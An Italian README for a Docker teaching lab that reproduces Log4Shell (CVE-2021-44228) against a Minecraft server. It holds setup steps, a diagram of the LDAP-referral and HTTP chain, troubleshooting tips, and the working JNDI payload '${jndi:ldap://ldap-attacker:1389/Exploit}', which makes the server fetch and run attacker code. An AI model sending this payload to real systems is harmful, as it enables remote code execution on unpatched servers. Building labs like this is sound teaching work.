# Lab Log4Shell — CVE-2021-44228
> Ambiente didattico per replicare la vulnerabilità Log4Shell

---

## Struttura

```
.
├── docker-compose.yml
├── Dockerfile.ldap          ← build marshalsec da sorgente
└── payload/
    ├── Exploit.java
    ├── Exploit.class        ← da (ri)compilare con Java 8 target
    └── compile.sh
```

---

## Perché il server HTTP è necessario

```
Client A        mc-server          ldap-attacker       http-attacker
   │                │                    │                    │
   │ ${jndi:ldap://ldap-attacker:1389/Exploit}               │
   │──────────────>│                    │                    │
   │               │ LDAP lookup        │                    │
   │               │──────────────────>│                    │
   │               │                   │ HTTP GET /Exploit.class
   │               │                   │──────────────────>│
   │               │                   │<── Exploit.class ──│
   │               │<── JNDI referral ─│                    │
   │               │ carica + esegue Exploit.class           │
   │               │ → crea /tmp/hacked.txt                  │
```

Il server LDAP (marshalsec LDAPRefServer) **non contiene** la classe
malevola: risponde alla lookup con una **referral** che punta al server
HTTP. È il server HTTP a servire il bytecode `Exploit.class`.

---

## Passi

### 1. Compila Exploit.java (OBBLIGATORIO, target Java 8)

```bash
cd payload
bash compile.sh
```

Verifica: `javap -verbose Exploit.class | grep "major version"` → deve essere **52** (Java 8).

### 2. Avvia il lab

```bash
# La prima volta ci vuole tempo: Maven scarica le dipendenze di marshalsec
docker compose up --build
```

Aspetta che vedi nel log di `ldap-attacker`:
```
Listening on 0.0.0.0:1389
```

### 3. Connettiti al server Minecraft

- **IP**: `localhost`  
- **Porta**: `25565`  
- **Versione**: `1.16.5`  
- **Online mode**: disabilitato (puoi usare qualsiasi username)

### 4. Invia il payload dalla chat

```
${jndi:ldap://ldap-attacker:1389/Exploit}
```

> ⚠️ Prisma Launcher gira fuori Docker: usa `localhost` (non `ldap-attacker`)
> per la stringa che invii dalla chat. Il server Minecraft è **dentro** Docker
> e risolve `ldap-attacker` tramite DNS interno.
> 
> La stringa nella chat viene loggata dal SERVER, che fa la lookup verso
> `ldap-attacker:1389`. Il client (Prisma) non fa nessuna lookup JNDI.

### 5. Verifica

```bash
# Verifica sul server Minecraft (Linux, dentro Docker)
docker exec mc-server cat /tmp/hacked.txt

# Log del server LDAP (deve mostrare la connessione in arrivo)
docker logs ldap-attacker

# Log del server HTTP (deve mostrare il GET /Exploit.class)
docker logs http-attacker
```

---

## Troubleshooting

| Sintomo | Causa | Fix |
|---------|-------|-----|
| `docker logs ldap-attacker` vuoto o errore | marshalsec non compilato | Aspetta la build o vedi `--build` |
| Nessun GET in `http-attacker` | La JVM lookup non parte | Controlla `JAVA_TOOL_OPTIONS` e versione immagine itzg |
| `ClassFormatError` | Exploit.class compilato con Java > 8 | Ri-compila con `--release 8` |
| `Cannot connect to server` | mc-server non ancora pronto | Aspetta `Done (x.xs)!` nei log |

---

## Spiegare la Kill Chain

1. **Delivery** → Client A scrive `${jndi:ldap://...}` nella chat  
2. **Exploit** → `mc-server` logga il messaggio con Log4j 2.x; Log4j risolve la JNDI expression invece di scrivere testo  
3. **Callback** → `ldap-attacker` riceve la lookup e risponde con una referral verso `http-attacker:8888/Exploit.class`  
4. **Payload** → La JVM del server scarica e carica `Exploit.class`, il blocco `static {}` viene eseguito  
5. **Impact** → `/tmp/hacked.txt` creato nel container del server
